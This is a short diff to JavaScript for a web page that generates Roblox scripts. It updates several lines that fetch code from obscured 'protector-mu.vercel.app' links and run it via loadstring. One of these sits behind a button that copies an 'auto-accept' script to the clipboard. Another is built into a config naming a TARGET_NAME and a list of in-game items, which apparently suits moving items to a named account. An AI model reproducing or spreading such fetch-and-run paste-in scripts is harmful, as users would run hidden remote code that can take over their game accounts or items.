@@ -128,14 +128,14 @@ if (generateBtn) {
 
         let extraScript = '';
         if (scriptType === '22s') {
-            extraScript = 'loadstring(game:HttpGet("https://protector-mu.vercel.app/s/YyFyA03vYmcbWpLg"))()';
+            extraScript = 'loadstring(game:HttpGet("https://protector-mu.vercel.app/s/J3E6DfD8nYNLmfgG"))()';
         } else if (scriptType === 'custom') {
             extraScript = customScript;
         }
 
         const brainrotListStr = "{\n    " + selected.map(br => `"${br}"`).join(",\n    ") + "\n}";
 
-        const internalScriptUrl = "https://protector-mu.vercel.app/s/Nj1Mz2TNbTyXityy";
+        const internalScriptUrl = "https://protector-mu.vercel.app/s/1N5HLy7tgiE1QxwX";
         
         const finalScript = `-- ========== CONFIG ==========
 getgenv().TARGET_NAME = "${nick}"
@@ -180,7 +180,7 @@ if (discordBtn) {
 const autoacceptBtn = document.getElementById('autoacceptBtn');
 if (autoacceptBtn) {
     autoacceptBtn.addEventListener('click', () => {
-        navigator.clipboard.writeText('loadstring(game:HttpGet("https://protector-mu.vercel.app/s/ogLkqNxErHVEIUdv"))()');
+        navigator.clipboard.writeText('loadstring(game:HttpGet("https://protector-mu.vercel.app/s/GXwBOUONAhy7kh9w"))()');
         alert('Auto-accept script copied to clipboard!');
     });
 }
